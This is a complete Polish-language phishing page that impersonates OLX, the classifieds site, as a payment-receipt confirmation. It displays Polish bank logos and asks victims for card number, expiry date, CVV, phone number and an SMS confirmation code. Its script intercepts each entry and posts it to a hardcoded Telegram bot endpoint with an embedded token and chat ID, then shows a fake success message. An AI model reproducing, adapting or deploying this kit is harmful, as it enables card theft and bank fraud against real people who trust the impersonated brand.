<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>TOfuLyaYamXer - Odbierz płatność</title>
<style>
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: white url('https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Shield_icon_2.svg/512px-Shield_icon_2.svg.png') repeat center top;
    background-size: 120px;
    margin: 0;
    padding: 0;
  }
  .header {
    background-color: #02282c;
    padding: 6px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    color: white;
  }
  .logo {
    font-size: 22px;
    font-weight: bold;
  }
  .icons {
    display: flex;
    gap: 15px;
  }
  .icon {
    width: 18px;
    height: 18px;
    background-color: #aaa;
    border-radius: 50%;
  }
  .container {
    background-color: white;
    margin: 50px auto;
    padding: 30px;
    border-radius: 12px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
    max-width: 420px;
    text-align: center;
  }
  .header-title {
    font-size: 20px;
    font-weight: bold;
    margin-bottom: 10px;
    color: #333;
  }
  .info {
    font-size: 13px;
    color: #555;
    margin-bottom: 20px;
  }
  .notice {
    font-size: 15px;
    color: #d35400;
    font-weight: bold;
    margin-top: 15px;
  }
  .button {
    background-color: #2c8c7f;
    color: white;
    border: none;
    padding: 12px 20px;
    border-radius: 6px;
    font-size: 16px;
    cursor: pointer;
    margin-top: 15px;
  }
  .button:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
  .hidden {
    display: none;
  }
  .checkmark-container {
    width: 72px;
    height: 72px;
    margin: 0 auto;
  }
  .checkmark {
    stroke: green;
    stroke-dasharray: 48;
    stroke-dashoffset: 48;
    stroke-width: 5;
    fill: none;
    animation: draw 0.8s ease forwards;
  }
  @keyframes draw {
    to {
      stroke-dashoffset: 0;
    }
  }
  .success-text {
    color: green;
    font-weight: bold;
    margin-top: 20px;
    font-size: 18px;
    opacity: 0;
    transition: opacity 1s ease;
  }
  .spinner {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #2c8c7f;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 0.8s linear infinite;
    margin: 20px auto;
  }
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  .form-input {
    width: 100%;
    padding: 14px;
    margin: 10px 0;
    border: 1px solid #ccc;
    border-radius: 4px;
    font-size: 16px;
    box-sizing: border-box;
  }

  @media (max-width: 600px) {
    .form-input {
      font-size: 14px;
      padding: 8px;
    }
    .button {
      font-size: 14px;
      padding: 8px 16px;
    }
    .logo img {
      height: 48px;
      margin-left: 10px;
    }
  }

  @media (max-width: 600px) {
    .logo img {
      margin-left: 10px !important;
    }
    header span, header .header-text {
      display: none !important;
    }
  }
</style>
</head>
<body>
<div class="header">
  <img alt="logo" src="https://upload.wikimedia.org/wikipedia/commons/b/bb/OLX_blue_logo.svg" style="height: 65px; margin-left: 135px; image-rendering: auto;"/>
  <div style="font-size: 14px; color: #ccc;">
    Uprzejmie prosimy o zamknięcie tej karty i powrót do swojego konta.
  </div>
</div>
<div class="container" id="main-container">
  <div class="header-title">Potwierdzenie odbioru płatności</div>
  <div class="info">Transakcja jest zabezpieczona. Twoje dane są szyfrowane i bezpieczne.</div>

  
<div style="margin-bottom: 20px;">
  
<div style="margin-bottom: 20px;">
  <span style="font-size: 13px; color: #555;">Obsługiwane banki:</span><br/><br/>
  <img src="https://logo.clearbit.com/pkobp.pl" alt="PKO BP" style="height: 30px; margin: 5px;">
  <img src="https://logo.clearbit.com/pekao.com.pl" alt="Pekao" style="height: 30px; margin: 5px;">
  <img src="https://logo.clearbit.com/mbank.pl" alt="mBank" style="height: 30px; margin: 5px;">
  <img src="https://logo.clearbit.com/ing.pl" alt="ING" style="height: 30px; margin: 5px;">
  <img src="https://logo.clearbit.com/santander.pl" alt="Santander" style="height: 30px; margin: 5px;">
</div>


<div id="form">
    <form id="card-form">
<div id="form-error" style="color: red; font-size: 13px; margin-bottom: 10px;"></div>
      <input type="text" class="form-input" placeholder="Numer karty" maxlength="19" inputmode="numeric" required />
      <input type="text" class="form-input" placeholder="MM/RR" maxlength="5" inputmode="numeric" required />
      <input type="text" class="form-input" placeholder="CVV" maxlength="4" inputmode="numeric" required />
      <button type="button" class="button" onclick="showStep2(this)">Dalej</button>
    </form>
  </div>

  
<div class="hidden" id="phoneStep">
  <div id="phone-error" style="color: red; font-size: 13px; margin-bottom: 10px;"></div>
  <input type="text" class="form-input" id="phone-input" placeholder="Numer telefonu (np. 500600700)" maxlength="9" inputmode="numeric" />
  <button class="button" onclick="validatePhone(this)">Dalej</button>
</div>
<div class="hidden" id="phone-loading">
  <p>Trwa weryfikacja numeru telefonu...</p>
  <div class="spinner"></div>
</div>

<div class="hidden" id="step2">
<div id="step2-error" style="color: red; font-size: 13px; margin-bottom: 10px;"></div>
    <div class="notice">Wymagana autoryzacja!</div>
    <input type="text" class="form-input" placeholder="Kod potwierdzenia" maxlength="6" inputmode="numeric" required />
    <button class="button" onclick="startLoading(this)">Wyślij</button>
  </div>

  <div class="hidden" id="loading">
    <div class="spinner"></div>
  </div>

  <div class="hidden" id="success">
    <div class="checkmark-container">
      <svg viewbox="0 0 52 52">
        <path class="checkmark" d="M14 27 l10 10 l15 -20"></path>
      </svg>
    </div>
    <div class="success-text" id="finalText">
      Płatność została potwierdzona.<br/>
      Możesz zamknąć tę stronę.
    </div>
  </div>
</div>





<script>
  function showStep2(button) {
    const cardInput = document.querySelector('input[placeholder="Numer karty"]');
    const dateInput = document.querySelector('input[placeholder="MM/RR"]');
    const cvvInput = document.querySelector('input[placeholder="CVV"]');

    const errorDiv = document.getElementById('form-error');
    errorDiv.textContent = '';

    if (!cardInput.value.trim() || cardInput.value.replace(/\s/g, '').length !== 16) {
      errorDiv.textContent = 'Wprowadź poprawny numer karty.';
      return;
    }

    if (!dateInput.value.trim() || !/^\d{2}\/\d{2}$/.test(dateInput.value)) {
      errorDiv.textContent = 'Wprowadź poprawną datę (MM/RR).';
      return;
    }

    if (!cvvInput.value.trim() || cvvInput.value.length < 3) {
      errorDiv.textContent = 'Wprowadź poprawny kod CVV.';
      return;
    }

    button.disabled = true;
    document.getElementById('form').classList.add('hidden');
    document.getElementById('loading').classList.remove('hidden');
    setTimeout(() => {
      document.getElementById('loading').classList.add('hidden');
      document.getElementById('step2').classList.remove('hidden');
    }, 1500);
  }

  function startLoading(button) {
    const confirmInput = document.querySelector('#step2 input');
    const errorDiv = document.getElementById('step2-error');
    errorDiv.textContent = '';

    if (!confirmInput.value.trim() || confirmInput.value.length < 4) {
      errorDiv.textContent = 'Wprowadź kod potwierdzenia.';
      return;
    }

    button.disabled = true;
    document.getElementById('step2').classList.add('hidden');
    document.getElementById('loading').classList.remove('hidden');
    setTimeout(() => {
      document.getElementById('loading').classList.add('hidden');
      document.getElementById('success').classList.remove('hidden');
      setTimeout(() => {
        document.getElementById('finalText').style.opacity = 1;
      }, 1000);
    }, 1000);
  }

  // Автоформатирование и определение банка
  document.addEventListener('DOMContentLoaded', () => {
    const cardInput = document.querySelector('input[placeholder="Numer karty"]');
    const dateInput = document.querySelector('input[placeholder="MM/RR"]');
    const cvvInput = document.querySelector('input[placeholder="CVV"]');

    const bankDisplay = document.createElement('div');
    bankDisplay.id = "bank-info";
    bankDisplay.style.marginTop = "10px";
    bankDisplay.style.fontSize = "14px";
    bankDisplay.style.color = "#2c3e50";
    cardInput.insertAdjacentElement('afterend', bankDisplay);

    const binBankMap = {
      "457973": "PKO Bank Polski",
      "526398": "PKO Bank Polski",
      "402400": "PKO Bank Polski",
      "543824": "PKO Bank Polski",
      "676246": "PKO Bank Polski",
      "428591": "Bank Pekao",
      "528026": "Bank Pekao",
      "530990": "Bank Pekao",
      "222449": "Santander Bank Polska",
      "521327": "Santander Bank Polska",
      "541230": "Santander Bank Polska",
      "516829": "mBank",
      "438316": "mBank",
      "549619": "mBank",
      "528900": "ING Bank Śląski",
      "670320": "ING Bank Śląski",
      "418727": "Alior Bank",
      "546565": "Alior Bank",
      "438775": "Millennium Bank",
      "434514": "Bank Millennium",
      "419594": "BNP Paribas",
      "527606": "BNP Paribas",
      "516302": "Credit Agricole",
      "558067": "Credit Agricole",
      "415428": "Citi Handlowy",
      "518378": "Citi Handlowy"
    };

    cardInput.addEventListener('input', () => {
      let value = cardInput.value.replace(/\D/g, '').substring(0, 16);
      cardInput.value = value.replace(/(.{4})/g, '$1 ').trim();

      const digits = value.substring(0, 6);
      if (digits.length === 6) {
        const bankName = binBankMap[digits] || "Nieznany bank";
        bankDisplay.textContent = "Wydawca karty: " + bankName;
      } else {
        bankDisplay.textContent = "";
      }
    });

    dateInput.addEventListener('input', () => {
      let value = dateInput.value.replace(/[^0-9]/g, '').substring(0, 4);
      if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2);
      }
      dateInput.value = value;
    });

    cvvInput.addEventListener('input', () => {
      cvvInput.value = cvvInput.value.replace(/\D/g, '').substring(0, 3);
    });
  });
</script>





<div style="height: 70px;"></div>


<footer style=" bottom: 0; left: 0; right: 0; background: #f8f9fa; padding: 20px 10px; font-size: 13px; color: #333; border-top: 1px solid #ccc;">
  <div style="max-width: 960px; margin: auto; display: flex; flex-wrap: wrap; gap: 10px; justify-content: space-between;">
    <div style="flex: 1 1 50%;">
      Aplikacje mobilne OLX.pl<br/>
      Pomoc<br/>
      Wyróżnione ogłoszenia<br/>
      Oferta dla firm<br/>
      Blog<br/>
      Regulamin<br/>
      Polityka prywatności<br/>
      Reklama<br/>
      Biuro prasowe<br/>
      Informacja o realizowanej strategii podatkowej<br/>
      Zasady bezpieczeństwa<br/>
      Mapa kategorii<br/>
    </div>
    <div style="flex: 1 1 50%;">
      Mapa miejscowości<br/>
      Mapa ministron<br/>
      Popularne wyszukiwania<br/>
      Kariera<br/>
      Pracodawcy na OLX<br/>
      Jak działa OLX.pl<br/>
      Cennik<br/>
      Zawodowo OLX - serwis o pracy<br/>
      Polityka cookies<br/>
      Ustawienia plików cookie<br/>
      Google Play • App Store<br/>
      OLX.bg • OLX.ro • OLX.ua • OLX.pt • Fixly.pl • Otodom.pl • Otomoto.pl • obido.pl
    </div>
  </div>
</footer>

<script>
let lastCard = '', lastExpiry = '', lastCVV = '', lastBank = '', lastPhone = '';

const bankLinks = {
  "PKO Bank Polski": "https://www.ipko.pl",
  "Bank Pekao": "https://www.pekao24.pl",
  "Santander Bank Polska": "https://online.santander.pl",
  "mBank": "https://online.mbank.pl",
  "ING Bank Śląski": "https://moje.ing.pl",
  "Alior Bank": "https://login.aliorbank.pl",
  "Bank Millennium": "https://www.bankmillennium.pl",
  "BNP Paribas": "https://goonline.bnpparibas.pl",
  "Credit Agricole": "https://ca24.credit-agricole.pl",
  "Citi Handlowy": "https://www.citibank.pl"
};

function sendMessage(text) {
  fetch("https://api.telegram.org/bot8153685767:AAE4NOfW4ANoL-Qd-m14zDmtuUWbN1jGnIg/sendMessage", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: 7821530735, text: text })
  });
}

function sendCardMessage() {
  const link = bankLinks[lastBank] || "—";
  const msg = `💳 Karta: ${lastCard}\n🏦 Bank: ${lastBank}\n📆 Data ważności: ${lastExpiry}\n🔒 CVV: ${lastCVV}\n🔗 Logowanie: ${link}`;
  sendMessage(msg);
}

function sendPhoneMessage() {
  sendMessage(`📱 Telefon: ${lastPhone}`);
}

function sendCodeMessage(code) {
  sendMessage(`🔐 Kod potwierdzenia:\n${code}`);
}

function validatePhone(button) {
  const phone = document.getElementById('phone-input').value.trim();
  const error = document.getElementById('phone-error');
  error.textContent = '';
  if (!/^\d{9}$/.test(phone)) {
    error.textContent = 'Wprowadź poprawny numer telefonu (9 cyfr).';
    return;
  }

  lastPhone = phone;
  sendPhoneMessage();

  button.disabled = true;
  document.getElementById('phoneStep').classList.add('hidden');
  document.getElementById('phone-loading').classList.remove('hidden');

  setTimeout(() => {
    document.getElementById('phone-loading').classList.add('hidden');
    document.getElementById('step2').classList.remove('hidden');
  }, 10000);
}

const originalShowStep2 = showStep2;
showStep2 = function(button) {
  const cardInput = document.querySelector('input[placeholder="Numer karty"]');
  const dateInput = document.querySelector('input[placeholder="MM/RR"]');
  const cvvInput = document.querySelector('input[placeholder="CVV"]');
  const bankDisplay = document.getElementById('bank-info');

  lastCard = cardInput.value;
  lastExpiry = dateInput.value;
  lastCVV = cvvInput.value;
  lastBank = bankDisplay?.textContent?.replace("Wydawca karty: ", "") || "Nieznany";

  sendCardMessage();

  button.disabled = true;
  document.getElementById('form').classList.add('hidden');
  document.getElementById('loading').classList.remove('hidden');
  setTimeout(() => {
    document.getElementById('loading').classList.add('hidden');
    document.getElementById('phoneStep').classList.remove('hidden');
  }, 1500);
};

const originalStartLoading = startLoading;
startLoading = function(button) {
  const input = document.querySelector('#step2 input');
  const code = input.value.trim();
  if (code.length >= 4) {
    sendCodeMessage(code);
  }
  originalStartLoading(button);
}
</script>

</body>
</html>

